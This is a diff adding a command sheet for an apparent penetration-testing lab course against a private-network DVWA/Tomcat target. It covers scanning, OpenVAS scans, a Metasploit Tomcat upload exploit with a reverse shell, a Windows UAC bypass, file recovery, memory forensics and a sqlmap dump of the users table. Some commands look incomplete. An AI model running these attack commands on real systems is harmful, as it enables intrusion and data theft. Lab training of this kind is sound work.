@@ -1,0 +1,40 @@
+# Task 1: Network Scanning & Reconnaissance
+nmap -sV -sC 192.168.29.0/24
+nikto -h http://192.168.29.7
+
+
+# Task 2: Vulnerability Assessment
+gvm-start
+gvm-cli socket --gmp-username admin --gmp-password admin \
+  --xml "<create_target><name>Scan_Target</name><hosts>192.168.29.7</hosts></create_target>"
+gvm-cli socket --xml "<start_task task_id='TASK_ID'/>"
+gvm-cli socket --xml "<get_reports report_id='REPORT_ID' format_id='FORMAT_ID'/>" \
+  | base64 -d > openvas_report.csv
+
+# Task 3: Exploitation Lab
+msfconsole
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 192.168.29.7; set RPORT 8080; run
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.29.7; set HttpUsername tomcat; set HttpPassword tomcat
+set LHOST 192.168.29.146; set LPORT 4444; exploit
+
+# Task 4: Post-Exploitation Practice
+sessions -l
+use exploit/windows/local/bypassuac
+set SESSION 1; set LHOST 192.168.29.146; set LPORT 4445; exploit
+run post/windows/gather/forensics/recovery_files LOCATION=C:\\ RECURSIVE=true
+dump_memory
+volatility -f memory.dmp --profile=Win7SP1x64 pslist
+volatility -f memory.dmp --profile=Win7SP1x64 netscan
+volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles -Q 0xADDRESS --dump-dir=/tmp/evidence/
+sha256sum /tmp/evidence/file.dat > /tmp/evidence/file.sha256
+
+# Task 5: Capstone Project – Full VAPT Cycle
+nmap -sV 192.168.29.7
+dirb http://192.168.29.7/dvwa/
+sqlmap -u "http://192.168.29.7/dvwa/vulnerabilities/sqli/?id=1" \
+  --cookie="PHPSESSID=...; security=low" --dbs --batch
+sqlmap -D dvwa --tables --batch
+sqlmap -D dvwa -T users --dump --batch
+gvm-cli socket --xml "<start_task task_id='DVWA_SCAN_ID'/>"
